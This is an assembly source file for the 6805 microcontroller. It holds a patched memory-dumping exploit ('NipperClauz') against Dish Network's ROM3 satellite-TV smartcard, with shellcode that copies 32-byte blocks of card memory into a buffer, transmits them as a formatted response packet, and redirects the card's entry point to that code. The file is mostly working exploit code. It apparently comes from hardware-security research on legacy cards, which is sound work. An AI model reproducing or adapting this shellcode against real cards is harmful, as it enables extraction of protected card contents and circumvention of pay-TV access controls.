;;; Patched NipperClauz exploit for Dish Network's ROM3 card.
;;; Travis Goodspeed, 2022

	.lang 6805

;;; Early part will be clobbered by our transmit script.
;;; 0x19C in native addresses.
        .db "NipperTool", 0x00
        

;;; Code can go here, at 0x01c4.
        .org 0x28

	;; Data buffer is at 0x019C.  We copy backward from the last byte.
	ldx #0x20
loop:
	lda @0xffff, x          ; 0xffff replaced with source address.
	sta @0x01a1, x          ; 0x01a1 is end of buffer in SRAM, begins at 0x19c.
	dec x
	bpl loop

        ;; Call respondax(0x93, 0x40) to transmit packet.
	lda #0x93		; Response code 0x93.
	ldx #0x40		; Length in bytes.
	.equ respondax 0x757f
	jsr respondax		; Send response.

        rsp                     ; Reset the stack pointer.
        .equ RESET 0x4000       ; 4000 for total reset
        jp RESET


;;; This is a 32 byte gap at 0x2000 (ghost of 0x0000)
;;; These 32 bytes always read as zero, are not a mirror of registers.
        .org 0x64
        .db "Register gap."

        
        .org 0x84
;;; These are the early global variables at 0x0220 (ghost of 0x0020). 
        .db 0x00, 0x01, 0x02, 0x03,
	.db 0x05, 0x0A, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
	.db 0x0C, 0x0D, 0x0E, 0x0F, 0x01, 0x01, 0x01, 0x00,
	.db 0x00, 0x00, 0xFF, 0x07, 0x52, 0x56, 0x73, 0x03,
	.db 0xCD, 0xDC, 0x34, 0xC3,

;;; Rather than dump the data directly out to the serial port
;;; as the NipperClauz and Headend exploits do, this shellcode
;;; instead returns a properly formatted packet of just 32 bytes.
;;; This wasn't needed for serial port adapters in 1998, but it's
;;; necessary for USB readers in 2022.

	;; Entry point for more shellcode at 0x0060.
        .def moreshellcode 0x0060
        .org 0xa4

        
	;; These three bytes will be clobbered.  Don't rely on them.
        .org 0xbd
	.db 0, 0, 0
	;; These bytes set the entry point of 0x0060.
	;; .db 0x00, 0x00, 0x00, 0x60  ; Late entry, to shellcode at 0x0060.
        .db 0x00, 0x00, 0x01, 0xc4      ; Early entry, to shellcode at 0x019c.


